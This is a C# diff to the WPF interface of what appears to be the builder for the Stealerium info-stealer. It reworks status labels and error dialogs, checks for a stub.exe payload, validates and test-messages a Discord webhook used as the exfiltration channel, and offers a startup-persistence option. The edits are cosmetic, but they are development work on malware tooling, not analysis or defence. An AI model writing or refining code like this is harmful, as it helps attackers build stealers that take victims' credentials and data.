@@ -5,7 +5,7 @@ using Microsoft.Win32;
 
 namespace BuilderGUI
 {
-    public partial class MainWindow : Window
+    public partial class MainWindow
     {
         private string stubPath;
         private bool isStubDetected = false;
@@ -24,14 +24,20 @@ namespace BuilderGUI
 
             if (File.Exists(stubPath))
             {
-                StubStatusLabel.Text = $"Stub detected at: {stubPath}";
-                StubStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
+                StubStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
+                StubStatusLabel.Title = "Stub Detected";
+                StubStatusLabel.Message = $"Stub detected at: {stubPath}";
+                StubStatusLabel.IsOpen = true;
+                StubStatusLabel.IsClosable = false;
                 isStubDetected = true;
             }
             else
             {
-                StubStatusLabel.Text = "stub.exe not found! Please place it in the 'Stub' folder.";
-                StubStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
+                StubStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+                StubStatusLabel.Title = "Stub Not Found";
+                StubStatusLabel.Message = "stub.exe not found! Please place it in the 'Stub' folder.";
+                StubStatusLabel.IsOpen = true;
+                StubStatusLabel.IsClosable = false;
                 isStubDetected = false;
             }
 
@@ -48,33 +54,39 @@ namespace BuilderGUI
             var token = WebhookUrlTextBox.Text.Trim();
             if (string.IsNullOrEmpty(token))
             {
-                MessageBox.Show("Discord webhook URL cannot be empty.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
+                {
+                    Title = "Error",
+                    Content =
+                       "Discord webhook URL cannot be empty.",
+                };
+                _ = await uiMessageBox.ShowDialogAsync();
                 return;
             }
 
             TestWebhookButton.IsEnabled = false;
-            WebhookStatusLabel.Text = "Testing webhook...";
-            WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Black;
+            WebhookStatusLabel.Message = "Testing webhook...";
+            WebhookStatusLabel.IsOpen = true;
 
             isWebhookValid = await Discord.WebhookIsValidAsync(token);
 
             if (!isWebhookValid)
             {
-                WebhookStatusLabel.Text = "Invalid webhook URL!";
-                WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
+                WebhookStatusLabel.Message = "Invalid webhook URL!";
+                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
             }
             else
             {
                 bool messageSent = await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
                 if (messageSent)
                 {
-                    WebhookStatusLabel.Text = "Connected successfully!";
-                    WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
+                    WebhookStatusLabel.Message = "Connected successfully!";
+                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
                 }
                 else
                 {
-                    WebhookStatusLabel.Text = "Failed to send test message.";
-                    WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
+                    WebhookStatusLabel.Message = "Failed to send test message.";
+                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
                     isWebhookValid = false; // Consider webhook invalid if message fails
                 }
             }
@@ -89,7 +101,8 @@ namespace BuilderGUI
             // Since the webhook URL has changed, we need to re-validate it.
             isWebhookValid = false;
             UpdateBuildButtonState();
-            WebhookStatusLabel.Text = "";
+            WebhookStatusLabel.Message = "";
+            WebhookStatusLabel.IsOpen = false;
         }
 
         private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
@@ -123,7 +136,12 @@ namespace BuilderGUI
             var token = WebhookUrlTextBox.Text.Trim();
             if (string.IsNullOrEmpty(token))
             {
-                MessageBox.Show("Discord webhook URL cannot be empty.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
+                {
+                    Title = "Error",
+                    Content = "Discord webhook URL cannot be empty.",
+                };
+                _ = uiMessageBox.ShowDialogAsync();
                 return;
             }
 
